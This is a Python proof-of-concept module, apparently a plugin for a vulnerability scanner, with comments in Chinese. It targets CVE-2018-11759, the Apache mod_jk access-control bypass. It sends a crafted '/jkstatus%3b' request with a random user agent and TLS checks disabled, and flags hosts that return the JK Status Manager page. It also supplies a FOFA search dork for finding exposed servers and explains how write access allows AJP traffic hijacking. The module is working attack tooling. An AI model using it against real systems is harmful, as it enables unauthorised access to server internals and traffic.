# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "Apache Mod_jk 访问控制权限绕过(CVE-2018-11759)",                        # 漏洞名称
        "VulnID" : "oFx-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "Apache Mod_jk",                     # 漏洞应用名称
        "AppVersion" : "Apache Mod_jk Connector 1.2.0 ~ 1.2.44",                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            Apache Tomcat JK（mod_jk）Connector是美国阿帕奇（Apache）软件基金会的一款为Apache或IIS提供连接后台Tomcat的模块，
            用以为Apache或IIS服务器提供处理JSP/Servlet的能力。

            由于httpd和Tomcat在路径处理规范上存在差异，
            因此可以绕过Apache mod_jk Connector 1.2.0版本到1.2.44版本上由JkMount httpd指令所定义端点的访问控制限制。 
            如果一个只有只读权限的jkstatus的接口可以访问的话，那么就有可能能够公开由mod_jk模块给AJP提供服务的内部路由。 
            如果一个具有读写权限的jkstatus接口可供访问，我们就能通过修改AJP的配置文件中相关配置来劫持或者截断所有经过mod_jk的流量，又或者进行内部的端口扫描。
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            app="mod_jk"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "/jkstatus%3b" # url自己按需调整
        

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    # "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if "JK Status Manager for" in req.text and "<title>JK Status Manager</title>" in req.text:#req.status_code == 200 and :
                vuln = [True,req.text]
            else:
                vuln = [False,req.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()